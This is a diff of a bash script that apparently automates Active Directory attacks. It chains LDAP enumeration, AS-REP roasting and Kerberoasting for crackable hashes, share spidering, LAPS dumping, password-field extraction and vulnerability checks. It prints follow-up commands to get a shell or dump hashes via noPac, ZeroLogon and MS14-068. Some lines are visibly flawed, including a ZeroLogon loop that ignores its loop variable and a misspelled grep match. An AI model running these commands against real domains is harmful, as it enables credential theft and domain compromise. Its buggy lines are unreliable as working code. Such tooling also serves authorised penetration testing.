-            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
-            ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -stdout | tee -a ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
-            cd ${current_dir}
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+            else
+                current_dir=$(pwd)
+                cd ${output_dir}/DomainRecon/ADCS
+                if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+                ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} 2>&1 | tee ${output_dir}/DomainRecon/ADCS/certipy_output_${dc_domain}.txt
+                ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -stdout 2>&1 | tee -a ${output_dir}/DomainRecon/ADCS/certipy_vulnerable_output_${dc_domain}.txt
+                cd ${current_dir}
+            fi
         fi
     fi
     echo -e ""
@@ -632,16 +670,17 @@ ldapdomaindump_enum () {
         echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
     else
         echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
-        if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDomainDump/ 2>/dev/null)" ] ; then
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDomainDump/ | grep -v 'ldd_output' 2>/dev/null)" ] ; then
             echo -e "${YELLOW}[i] ldapdomaindump results found, skipping... ${NC}"
         else
             if [ "${nullsess_bool}" == true ] ; then
-                ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>/dev/null
+                ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
             elif [ "${kerb_bool}" == true ] ; then
-                    echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos tickets${NC}"
+                echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos tickets${NC}"
             else
+                if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] ldapdomaindump does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="ldaps"; else ldaps_param="ldap"; fi
-                ${ldapdomaindump} ${argument_ldapdns} ${ldaps_param}://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>/dev/null
+                ${ldapdomaindump} ${argument_ldapdns} ${ldaps_param}://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDomainDump 2>&1 | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
             fi
         #Parsing user and computer lists
         /bin/cat ${output_dir}/DomainRecon/LDAPDomainDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldd_${dc_domain}.txt 2>&1
@@ -656,21 +695,22 @@ silenthound_enum () {
         echo -e "${RED}[-] Please verify the location of silenthound${NC}"
     else
         echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
-        if [ -n "$(ls -A ${output_dir}/DomainRecon/SilentHound/ 2>/dev/null)" ] ; then
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/SilentHound/ | grep -v 'silenthound_output' 2>/dev/null)" ] ; then
             echo -e "${YELLOW}[i] SilentHound results found, skipping... ${NC}"
         else
-            if [ "${kerb_bool}" == false ]; then
+            if [ "${kerb_bool}" == true ]; then
+                echo -e "${PURPLE}[-] SilentHound does not support kerberos tickets${NC}"
+            else
+                if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] SilentHound does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                 current_dir=$(pwd)
                 cd ${output_dir}/DomainRecon/SilentHound
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
-                ${scripts_dir}/silenthound.py ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain} > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt 2>/dev/null
+                ${scripts_dir}/silenthound.py ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain} 2>&1 > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt
                 cd ${current_dir}
                 /bin/cp ${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt ${output_dir}/DomainRecon/servers_list_shd_${dc_domain}.txt 2>/dev/null
                 head -n 20 ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt 2>/dev/null
                 echo -e "............................(truncated output)"
                 echo -e "${GREEN}[+] SilentHound enumeration complete.${NC}"
-            else
-                    echo -e "${PURPLE}[-] SilentHound does not support kerberos tickets${NC}"
             fi
         fi
     fi
@@ -682,10 +722,14 @@ ldeep_enum () {
         echo -e "${RED}[-] Please verify the location of ldeep${NC}"
     else
         echo -e "${BLUE}[*] ldeep Enumeration${NC}"
-        if [ -n "$(ls -A ${output_dir}/DomainRecon/ldeepDump/ 2>/dev/null)" ] ; then
+        if [ -n "$(ls -A ${output_dir}/DomainRecon/ldeepDump/ | grep -v 'ldeep_output' 2>/dev/null)" ] ; then
             echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
         else
-            ${ldeep} ldap ${argument_ldeep} -s ldap://"${target}" all ${output_dir}/DomainRecon/ldeepDump/${dc_domain} | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt 2>/dev/null
+            if [ "${kerb_bool}" == true ]; then
+                echo -e "${PURPLE}[-] ldeep does not support kerberos tickets${NC}"
+            else
+                ${ldeep} ldap ${argument_ldeep} -s ldap://"${target}" all ${output_dir}/DomainRecon/ldeepDump/${dc_domain} 2>&1 | tee ${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt
+            fi
         fi
     fi
     echo -e ""
@@ -696,7 +740,10 @@ windapsearch_enum () {
         echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
     else
         echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
-        if [ "${kerb_bool}" == false ]; then
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets${NC}"
+        else
+            if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
             ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt
             ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
@@ -706,14 +753,12 @@ windapsearch_enum () {
             /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep -a "sAMAccountName:" | sed "s/sAMAccountName: //g" | sort -u > ${output_dir}/DomainRecon/users_list_windap_${dc_domain}.txt 2>&1
             /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep -a "dNSHostName:" | sed "s/dNSHostName: //g" | sort -u > ${output_dir}/DomainRecon/servers_list_windap_${dc_domain}.txt 2>&1
             /bin/cat ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep -a "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/groups_list_windap_${dc_domain}.txt 2>&1
-            grep -iha "pass\|pwd" ${output_dir}/DomainRecon/windapsearch_*_${dc_domain}.txt 2>/dev/null | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExchBypassAudit"  > ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt
+            grep -iha "pass\|pwd" ${output_dir}/DomainRecon/windapsearch_*_${dc_domain}.txt 2>/dev/null | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch"  > ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt
             if [ -s "${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt" ] ; then
                 echo -e "${GREEN}[+] Printing passwords found in LDAP fields...${NC}"
                 /bin/cat ${output_dir}/DomainRecon/windapsearch_pwdfields_${dc_domain}.txt 2>/dev/null
             fi
             echo -e "${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}"
-        else
-                echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets${NC}"
         fi
     fi
     echo -e ""
@@ -784,11 +829,11 @@ asrep_attack () {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                 users_scan_list=${users_list}
             fi
-            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
+            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         else
-            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip}
-            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS}
+            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
         fi
         if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
             echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
@@ -839,7 +884,7 @@ kerberoast_attack () {
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
-                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
+                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} "${dc_domain}/" -dc-host ${dc_NETBIOS} > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
                 if grep -q 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 else
@@ -850,8 +895,8 @@ kerberoast_attack () {
             fi
         else
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS}
+            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
             if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
                 else
@@ -871,7 +916,7 @@ targetedkerberoast_attack () {
             echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-            ${scripts_dir}/targetedKerberoast.py ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt 2>&1
+            ${scripts_dir}/targetedKerberoast.py ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${output_dir}/Kerberos/targetedkerberoast_hashes_${dc_domain}.txt | tee ${output_dir}/Kerberos/targetedkerberoast_output_${dc_domain}.txt 2>&1
         fi
     fi
     echo -e ""
@@ -924,6 +969,7 @@ smb_map () {
         if [ "${kerb_bool}" == true ] ; then
             echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
         else
+            if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] smbmap does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
             smb_scan
             echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
             for i in $(/bin/cat ${servers_smb_list} | grep -v ":"); do
@@ -940,6 +986,7 @@ smb_map () {
                 if [ "${kerb_bool}" == true ] ; then
                     echo -e "${PURPLE}[-] smbmap does not support kerberos tickets${NC}"
                 else
+                    if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] smbmap does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
                     current_dir=$(pwd)
                     mkdir -p ${output_dir}/Shares/SharesDump/${i}
                     cd ${output_dir}/Shares/SharesDump/${i}
@@ -955,35 +1002,35 @@ smb_map () {
 shares_cme () {
     echo -e "${BLUE}[*] Enumerating Shares using crackmapexec ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" --shares 2>/dev/null | tee -a ${output_dir}/Shares/cme_shares_output${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" --shares 2>&1 | tee -a ${output_dir}/Shares/cme_shares_output${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 spider_cme () {
     echo -e "${BLUE}[*] Spidering Shares using crackmapexec ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>/dev/null | tee -a ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spider_plus -o OUTPUT="${output_dir}/Shares/cme_spider_plus" EXCLUDE_DIR="prnproc$,IPC$,print$,SYSVOL,NETLOGON" 2>&1 | tee -a ${output_dir}/Shares/cme_spider_output${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 keepass_scan () {
     echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
     for i in $(/bin/cat ${servers_smb_list}); do
         echo -e "${CYAN}[*] keepass_discover of ${i} ${NC}"
-        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M keepass_discover 2>/dev/null | tee -a ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M keepass_discover 2>&1 | tee -a ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
     done
     echo -e ""
 }
@@ -991,19 +1038,21 @@ keepass_scan () {
 ###### Vulnerability checks
 nopac_check () {
     echo -e "${BLUE}[*] NoPac check ${NC}"
-    ${crackmapexec} smb ${target} "${argument_cme[@]}" -M nopac 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
-    if grep -q "VULNEABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
-        echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
-        echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -shell [-use-ldap]"
-        echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host $dc_NETBIOS --impersonate Administrator -dump [-use-ldap]"
-    fi
+    for i in $(/bin/cat ${target_dc}); do
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M nopac 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
+        if grep -q "VULNEABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
+            echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
+            echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]"
+            echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]"
+        fi
+    done
     echo -e ""
 }
 
 petitpotam_check () {
     echo -e "${BLUE}[*] PetitPotam check ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M petitpotam 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M petitpotam 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_petitpotam_output_${dc_domain}.txt 2>&1
     done
     echo -e ""
 }
@@ -1011,14 +1060,16 @@ petitpotam_check () {
 dfscoerce_check () {
     echo -e "${BLUE}[*] dfscoerce check ${NC}"
     for i in $(/bin/cat ${target_dc}); do
-        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M dfscoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
+        ${crackmapexec} smb ${i} "${argument_cme[@]}" -M dfscoerce 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_dfscoerce_output_${dc_domain}.txt 2>&1
     done
     echo -e ""
 }
 
 zerologon_check () {
     echo -e "${BLUE}[*] zerologon check. This may take a while... ${NC}"
-    ${crackmapexec} smb ${target} "${argument_cme[@]}" -M zerologon 2>/dev/null | tee ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
+    for i in $(/bin/cat ${target_dc}); do
+        ${crackmapexec} smb ${target_dc} "${argument_cme[@]}" -M zerologon 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>&1
+    done
     if grep -q "VULNERABLE" ${output_dir}/Vulnerabilities/cme_zerologon_output_${dc_domain}.txt 2>/dev/null; then
         echo -e "${GREEN}[+] Domain controller vulnerable to ZeroLogon found! Follow steps below for exploitation:${NC}"
         echo -e "cve-2020-1472-exploit.py $dc_NETBIOS $dc_ip"
@@ -1030,16 +1081,17 @@ zerologon_check () {
 }
 
 ms14-068_check () {
-    echo -e "${BLUE}[*] ms14-068 check ${NC}"
+    echo -e "${BLUE}[*] MS14-068 check ${NC}"
     if [ ! -f "${impacket_goldenPac}" ]; then
         echo -e "${RED}[-] goldenPac.py not found! Please verify the installation of impacket${NC}"
     else
-        if [ "${nullsess_bool}" == true ]; then
-            echo -e "${PURPLE}[-] ms14-068 requires credentials${NC}"
+        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] MS14-068 requires credentials and does not support kerberos tickets${NC}"
         else
-            ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} None -target-ip ${dc_ip} 2>/dev/null  | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
+            if [ "${forcekerb_bool}" == true ] ; then echo -e "${PURPLE}[-] impacket's goldenPac does not support kerberos tickets. Trying to use NTLM instead${NC}"; fi
+            ${impacket_goldenPac} ${argument_imp_gp}@${dc_FQDN} None -target-ip ${dc_ip} 2>&1 | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
             if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found (False positives possible on newer versions of Windows)! Follow steps below for exploitation:${NC}"
+                echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)! Follow steps below for exploitation:${NC}"
                 echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
             fi
         fi
@@ -1048,57 +1100,57 @@ ms14-068_check () {
 }
 
 ms17-010_check () {
-    echo -e "${BLUE}[*] ms17-010 check ${NC}"
+    echo -e "${BLUE}[*] MS17-010 check ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ms17-010 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ms17-010 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_ms17-010_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 spooler_check () {
     echo -e "${BLUE}[*] Print Spooler check ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spooler 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M spooler 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_spooler_output_${dc_domain}.txt 2>&1      
     echo -e ""
 }
 
 webdav_check () {
     echo -e "${BLUE}[*] WebDAV check ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M webdav 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M webdav 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_webdav_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 shadowcoerce_check () {
     echo -e "${BLUE}[*] shadowcoerce check ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M shadowcoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M shadowcoerce 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 smbsigning_check () {
     echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} 2>/dev/null | grep "signing:False" | sort -u | tee -a ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} 2>&1 | grep "signing:False" | sort -u | tee -a ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt 2>&1
     if [ ! -s ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt ]; then
         echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
     fi
@@ -1108,22 +1160,22 @@ smbsigning_check () {
 ntlmv1_check () {
     echo -e "${BLUE}[*] ntlmv1 check ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ntlmv1 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ntlmv1 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
 runasppl_check () {
     echo -e "${BLUE}[*] runasppl check ${NC}"
     if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M runasppl 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M runasppl 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1137,7 +1189,7 @@ mssql_enum () {
             ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
         fi
         if [ "${nullsess_bool}" == false ]; then
-            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
+            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} -dc-host ${dc_NETBIOS} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
 
         fi
         for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
@@ -1146,7 +1198,7 @@ mssql_enum () {
         if [ ! -f "${sql_ip_list}" ] ; then
              echo -e "${PURPLE}[-] No SQL servers servers found${NC}"
         else
-            ${crackmapexec} mssql ${target_sql} "${argument_cme[@]}" -M mssql_priv 2>/dev/null | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
+            ${crackmapexec} mssql ${target_sql} "${argument_cme[@]}" -M mssql_priv 2>&1 | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
         fi
     fi
     echo -e ""
@@ -1155,7 +1207,7 @@ mssql_enum () {
 ###### Password Dump
 laps_dump () {
     echo -e "${BLUE}[*] LAPS Dump${NC}"
-    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}.${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1164,7 +1216,7 @@ gmsa_dump () {
